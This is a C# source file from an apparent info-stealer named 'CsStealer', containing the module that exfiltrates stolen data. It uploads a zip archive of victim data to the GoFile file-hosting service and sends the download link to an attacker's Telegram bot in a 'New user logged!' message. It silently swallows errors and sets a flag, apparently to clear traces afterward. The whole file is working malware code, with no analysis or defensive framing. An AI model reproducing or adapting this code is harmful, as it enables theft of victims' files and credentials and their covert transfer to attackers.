using System;
using System.Text.Json;

namespace CsStealer
{
    public class FileUploader
    {
        public static async Task SendDatas(string botToken, string chatID, string zipFilePath)
        {
            try
            {
                string server = await GetGoFileServer();
                if (string.IsNullOrEmpty(server))
                {
                    return;
                }

                string downloadUrl = await UploadToGoFile(zipFilePath, server);

                if (string.IsNullOrEmpty(downloadUrl))
                {
                    return;
                }

                await SendTelegramMessage(botToken, chatID, downloadUrl, zipFilePath);
            }
            catch
            {
            }
        }

        private static async Task<string> GetGoFileServer()
        {
            using (HttpClient client = new HttpClient())
            {
                var response = await client.GetStringAsync("https://api.gofile.io/servers");
                
                using (JsonDocument doc = JsonDocument.Parse(response))
                {
                    var root = doc.RootElement;
                    if (root.GetProperty("status").GetString() == "ok")
                    {
                        var servers = root.GetProperty("data").GetProperty("servers");
                        if (servers.GetArrayLength() > 0)
                        {
                            return servers[0].GetProperty("name").GetString();
                        }
                    }
                }

                return null;
            }
        }

        private static async Task<string?> UploadToGoFile(string filePath, string server)
        {
            using (HttpClient client = new HttpClient())
            using (var form = new MultipartFormDataContent())
            {
                var fileStream = File.OpenRead(filePath);
                var fileContent = new StreamContent(fileStream);
                form.Add(fileContent, "file", Path.GetFileName(filePath));

                var response = await client.PostAsync($"https://{server}.gofile.io/uploadFile", form);
                var responseString = await response.Content.ReadAsStringAsync();

                fileStream.Close();

                using (JsonDocument doc = JsonDocument.Parse(responseString))
                {
                    var root = doc.RootElement;
                    if (root.GetProperty("status").GetString() == "ok")
                    {
                        return root.GetProperty("data").GetProperty("downloadPage").GetString();
                    }
                }

                return null;
            }
        }

        private static async Task SendTelegramMessage(string botToken, string chatID, string url, string filePath)
        {
            using (HttpClient client = new HttpClient())
            {
                string fileName = Path.GetFileName(filePath);
                FileInfo fileInfo = new FileInfo(filePath);
                string fileSize = FormatFileSize(fileInfo.Length);

                string message = $"*New user logged\\!*\n\n" +
                               $"📄 **Name:** `{EscapeMarkdown(fileName)}`\n" +
                               $"💾 **Size:** {fileSize}\n" +
                               $"🔗 **URL :** [Download here]({url})\n\n" +
                               $"_{DateTime.Now:dd/MM/yyyy HH:mm:ss}_";

                var content = new FormUrlEncodedContent(new[]
                {
                new KeyValuePair<string, string>("chat_id", chatID),
                new KeyValuePair<string, string>("text", message),
                new KeyValuePair<string, string>("parse_mode", "MarkdownV2")
            });

                string telegramUrl = $"https://api.telegram.org/bot{botToken}/sendMessage";
                await client.PostAsync(telegramUrl, content);

            }

            __Main__.ReadyToClear = true;
        }

        private static string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }

        private static string EscapeMarkdown(string text)
        {
            char[] specialChars = { '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!' };
            foreach (char c in specialChars)
            {
                text = text.Replace(c.ToString(), "\\" + c);
            }
            return text;
        }
    }
}